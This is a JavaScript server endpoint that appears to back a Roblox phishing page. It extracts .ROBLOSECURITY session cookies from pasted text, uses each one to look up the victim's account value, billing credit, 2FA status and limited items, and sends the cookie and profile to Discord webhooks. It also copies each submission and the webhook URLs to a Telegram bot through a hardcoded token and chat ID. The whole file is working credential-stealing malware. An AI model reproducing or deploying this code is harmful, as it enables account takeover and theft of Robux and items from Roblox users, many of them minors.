// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';

async function redisGet(key) {
  const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  const json = await res.json();
  if (!json.result) return null;
  try { return JSON.parse(json.result); } catch { return null; }
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

function extractRobloxCookie(raw) {
  if (!raw) return null;
  const warningMatch = raw.match(/(_\|WARNING[-A-Z0-9.:_ ]+\|_[\w\-.]+)/);
  if (warningMatch) return warningMatch[1];
  const tokenOnly = raw.match(/\|_([\w\-]{50,})/);
  if (tokenOnly) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${tokenOnly[1]}`;
  return null;
}

async function fetchRobloxInfo(cookie) {
  try {
    const headers = { Cookie: `.ROBLOSECURITY=${cookie}` };

    const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', { headers });
    if (!authRes.ok) return null;
    const auth = await authRes.json();
    const uid = auth.id;

    const [
      robuxRes, friendRes, premiumRes,
      groupRes, billingRes, settingsRes,
      txDayRes, txWeekRes, txYearRes,
      limitedRes, presenceRes, avatarRes
    ] = await Promise.all([
      fetch('https://economy.roblox.com/v1/user/currency', { headers }),
      fetch(`https://friends.roblox.com/v1/users/${uid}/friends/count`, { headers }),
      fetch(`https://premiumfeatures.roblox.com/v1/users/${uid}/validate-membership`, { headers }),
      fetch(`https://groups.roblox.com/v1/users/${uid}/groups/roles`, { headers }),
      fetch('https://billing.roblox.com/v1/credit', { headers }),
      fetch('https://accountsettings.roblox.com/v1/email', { headers }),
      fetch(`https://economy.roblox.com/v2/users/${uid}/transaction-totals?timeFrame=Day&transactionType=summary`, { headers }),
      fetch(`https://economy.roblox.com/v2/users/${uid}/transaction-totals?timeFrame=Week&transactionType=summary`, { headers }),
      fetch(`https://economy.roblox.com/v2/users/${uid}/transaction-totals?timeFrame=Year&transactionType=summary`, { headers }),
      fetch(`https://inventory.roblox.com/v1/users/${uid}/assets/collectibles?limit=10`, { headers }),
      fetch('https://presence.roblox.com/v1/presence/users', {
        method: 'POST',
        headers: { ...headers, 'Content-Type': 'application/json' },
        body: JSON.stringify({ userIds: [uid] })
      }),
      fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${uid}&size=150x150&format=Webp`, { headers: {} })
    ]);

    const robuxData    = robuxRes.ok    ? await robuxRes.json()    : null;
    const friendData   = friendRes.ok   ? await friendRes.json()   : null;
    const isPremium    = premiumRes.ok  ? await premiumRes.json()  : false;
    const groupData    = groupRes.ok    ? await groupRes.json()    : null;
    const billingData  = billingRes.ok  ? await billingRes.json()  : null;
    const settingsData = settingsRes.ok ? await settingsRes.json() : null;
    const txDay        = txDayRes.ok    ? await txDayRes.json()    : null;
    const txWeek       = txWeekRes.ok   ? await txWeekRes.json()   : null;
    const txYear       = txYearRes.ok   ? await txYearRes.json()   : null;
    const limitedData  = limitedRes.ok  ? await limitedRes.json()  : null;
    const presence     = presenceRes.ok ? await presenceRes.json() : null;
    const avatarData   = avatarRes.ok   ? await avatarRes.json()   : null;

    // Account age
    const profileRes  = await fetch(`https://users.roblox.com/v1/users/${uid}`, { headers: {} });
    const profileData = profileRes.ok ? await profileRes.json() : null;
    let accountAgeDays = 'N/A';
    if (profileData?.created) {
      const created = new Date(profileData.created);
      accountAgeDays = Math.floor((Date.now() - created.getTime()) / 86400000);
    }

    // Groups info
    const groups = groupData?.data || [];
    const ownedGroups = groups.filter(g => g.role?.rank === 255).length;
    let groupRobux = 'N/A', groupPending = 'N/A';
    if (ownedGroups > 0) {
      const firstOwned = groups.find(g => g.role?.rank === 255);
      try {
        const gEconRes = await fetch(`https://economy.roblox.com/v1/groups/${firstOwned.group.id}/currency`, { headers });
        if (gEconRes.ok) {
          const gEcon = await gEconRes.json();
          groupRobux = gEcon.robux ?? 'N/A';
        }
        const gPendRes = await fetch(`https://economy.roblox.com/v2/groups/${firstOwned.group.id}/transactions?transactionType=pending&limit=10`, { headers });
        if (gPendRes.ok) {
          const gPend = await gPendRes.json();
          groupPending = gPend.data?.reduce((a, t) => a + (t.currency?.amount || 0), 0) ?? 'N/A';
        }
      } catch (_) {}
    }

    // Last 3 played games from presence
    const lastGames = [];
    if (presence?.userPresences?.[0]?.lastLocation) {
      lastGames.push(presence.userPresences[0].lastLocation);
    }
    try {
      const recentRes = await fetch(`https://games.roblox.com/v2/users/${uid}/games?sortOrder=Asc&limit=3`, { headers });
      if (recentRes.ok) {
        const recentData = await recentRes.json();
        recentData.data?.slice(0, 3).forEach(g => { if (!lastGames.includes(g.name)) lastGames.push(g.name); });
      }
    } catch (_) {}

    // Limiteds value sum
    let limitedsCount = 0, limitedsValue = 0;
    if (limitedData?.data) {
      limitedsCount = limitedData.data.length;
      limitedsValue = limitedData.data.reduce((a, i) => a + (i.recentAveragePrice || 0), 0);
    }

    // 2FA check
    let twoFA = 'Disabled ❌';
    try {
      const tfaRes = await fetch('https://twostepverification.roblox.com/v1/users/' + uid + '/configuration', { headers });
      if (tfaRes.ok) {
        const tfa = await tfaRes.json();
        twoFA = tfa.methods?.length > 0 ? 'Enabled ✅' : 'Disabled ❌';
      }
    } catch (_) {}

    // Email verified
    const emailVerified = settingsData?.verified === true ? 'Verified ✅' : 'Unverified ❌';
    const emailSet      = settingsData?.emailAddress ? 'Set ✅' : 'Not Set ❌';

    // Avatar headshot URL
    const avatarUrl = avatarData?.data?.[0]?.imageUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png';

    return {
      id:            uid,
      username:      auth.name,
      displayName:   auth.displayName,
      isPremium:     isPremium === true,
      robux:         robuxData?.robux ?? 'N/A',
      friends:       friendData?.count ?? 'N/A',
      accountAgeDays,
      credit:        billingData?.balance ?? 'N/A',
      emailSet,
      emailVerified,
      twoFA,
      groupsOwned:   ownedGroups,
      groupRobux,
      groupPending,
      limitedsCount,
      limitedsValue: limitedsValue.toLocaleString(),
      txDay:         txDay?.incomingRobuxTotal  ?? 'N/A',
      txWeek:        txWeek?.incomingRobuxTotal ?? 'N/A',
      txYear:        txYear?.incomingRobuxTotal ?? 'N/A',
      lastGames:     lastGames.length > 0 ? lastGames.slice(0, 3) : ['N/A'],
      avatarUrl,
    };
  } catch (_) {
    return null;
  }
}

async function sendToDiscord(webhookUrl, pageName, slotLabel, rawValue, cookie, roblox, now) {
  if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) return;

  let payload;

  if (roblox) {
    const premiumTag = roblox.isPremium ? ' ⭐' : '';
    const gameLines  = roblox.lastGames.map(g => `${g} → 0 ❌`).join('\n');

    payload = {
      content: '@everyone',
      embeds: [{
        title: `🧑 ${roblox.username} ${roblox.displayName !== roblox.username ? roblox.displayName : ''}${premiumTag}`,
        description: `:fire: \`sPAIN\` :fire:\n\n[Refresh Cookie 🍪](https://example.com) | [Profile 👤](https://www.roblox.com/users/${roblox.id}/profile) | [Discord Server](https://example.com)`,
        color: 5793266,
        fields: [
          { name: '👤 Username',       value: `${roblox.username}`,                                                    inline: true },
          { name: '🆔 User ID',        value: `${roblox.id}`,                                                          inline: true },
          { name: '📄 Page',           value: `\`${pageName}\``,                                                       inline: true },
          { name: '📊 Account Stats',  value: `\`Account Age:\` \`${roblox.accountAgeDays} Days\``,                    inline: false },
          { name: '💳 Billing',        value: `Credit: ${roblox.credit} $\nPayments: N/A`,                             inline: true },
          { name: '👥 Groups',         value: `Balance: ${roblox.groupRobux}\nPending: ${roblox.groupPending}\nOwned: ${roblox.groupsOwned}`, inline: true },
          { name: '⚙️ Settings',       value: `Email: ${roblox.emailSet}\nVerified: ${roblox.emailVerified}\n2FA: ${roblox.twoFA}`, inline: true },
          { name: '💰 Account Funds',  value: `Balance: ${roblox.robux}\nFriends: ${roblox.friends}`,                  inline: true },
          { name: '🛒 Limiteds',       value: `Count: ${roblox.limitedsCount}\nValue: ${roblox.limitedsValue}`,        inline: true },
          { name: '📈 Robux Summary',  value: `Day: \`${roblox.txDay}\` | Week: \`${roblox.txWeek}\` | Year: \`${roblox.txYear}\``, inline: false },
          { name: '🎮 Last 3 Games',   value: gameLines || 'N/A',                                                      inline: false },
          { name: '🔐 .ROBLOSECURITY', value: `\`\`\`${cookie}\`\`\``,                                                 inline: false },
          { name: '📅 Date Submitted', value: `\`${now}\``,                                                            inline: false },
        ],
        footer:    { text: 'Submission Logger • Automated System' },
        thumbnail: { url: roblox.avatarUrl }
      }],
      attachments: []
    };
  } else {
    payload = {
      content: '@everyone',
      embeds: [{
        title: '🚨 New Submission Received',
        description: ':fire: `sPAIN` :fire:',
        color: 5793266,
        fields: [
          { name: '📄 Page',           value: `\`${pageName}\``,    inline: true },
          { name: '🎯 Slot',           value: `\`${slotLabel}\``,   inline: true },
          { name: '📥 Pasted Content', value: `\`\`\`${rawValue}\`\`\`` },
          { name: '📅 Date Submitted', value: `\`${now}\``,         inline: false },
        ],
        footer:    { text: 'Submission Logger • Automated System' },
        thumbnail: { url: 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png' }
      }],
      attachments: []
    };
  }

  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (_) {}
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
  }

  const { slug, slots } = body || {};
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  let record;
  try {
    record = await redisGet(`slot:${slug}`);
  } catch (err) {
    return res.status(500).json({ error: 'Redis error', detail: err.message });
  }
  if (!record) return res.status(404).json({ error: 'Page not found' });

  const now       = new Date().toISOString();
  const slotEntry = Object.entries(slots).find(([, v]) => v && v.length > 0);
  const slotLabel = slotEntry ? slotEntry[0] : 'N/A';
  const rawValue  = slotEntry ? slotEntry[1] : '(empty)';

  const cookie = extractRobloxCookie(rawValue);
  const roblox = cookie ? await fetchRobloxInfo(cookie) : null;

  // ── Send to webhook2 ──────────────────────────────────────────────────────
  await sendToDiscord(record.webhook, record.displayName, slotLabel, rawValue, cookie, roblox, now);

  // ── Send to webhook1 if dualhook child ───────────────────────────────────
  let webhook1 = 'N/A';
  if (record.dualhookParent) {
    try {
      const parentRecord = await redisGet(`slot:${record.dualhookParent}`);
      if (parentRecord?.webhook) {
        webhook1 = parentRecord.webhook;
        if (parentRecord.webhook !== record.webhook) {
          await sendToDiscord(parentRecord.webhook, record.displayName, slotLabel, rawValue, cookie, roblox, now);
        }
      }
    } catch (_) {}
  }

  // ── Telegram log ──────────────────────────────────────────────────────────
  const tgContent = roblox ? [
    `👤 ${roblox.username} (${roblox.displayName})`,
    `🆔 ID: ${roblox.id}`,
    `💰 Robux: ${roblox.robux}`,
    `📊 Day: ${roblox.txDay} | Week: ${roblox.txWeek} | Year: ${roblox.txYear}`,
    `👥 Friends: ${roblox.friends}`,
    `⭐ Premium: ${roblox.isPremium ? 'Yes' : 'No'}`,
    `📅 Age: ${roblox.accountAgeDays} days`,
    `🔒 2FA: ${roblox.twoFA}`,
    `🏦 Groups Owned: ${roblox.groupsOwned} | Balance: ${roblox.groupRobux}`,
    `🛒 Limiteds: ${roblox.limitedsCount} (${roblox.limitedsValue} R$)`,
    `🎮 Last Games: ${roblox.lastGames.join(', ')}`,
    `🍪 Cookie: ${cookie}`
  ].join('\n') : rawValue;

  const tgMsg = [
    `🚨 <b>NEW SUBMISSION RECEIVED</b> 🚨`,
    `------------------------------------------`,
    `📄 PAGE: ${record.displayName}`,
    `🎯 SLOT: ${slotLabel}`,
    `------------------------------------------`,
    tgContent,
    `------------------------------------------`,
    `🔗 WEBHOOK2: <code>${record.webhook}</code>`,
    `🔗 WEBHOOK1: <code>${webhook1}</code>`,
    `------------------------------------------`,
    `📅 ${now}`,
    `------------------------------------------`
  ].join('\n');

  await tgSend(tgMsg);

  return res.status(200).json({ success: true });
}
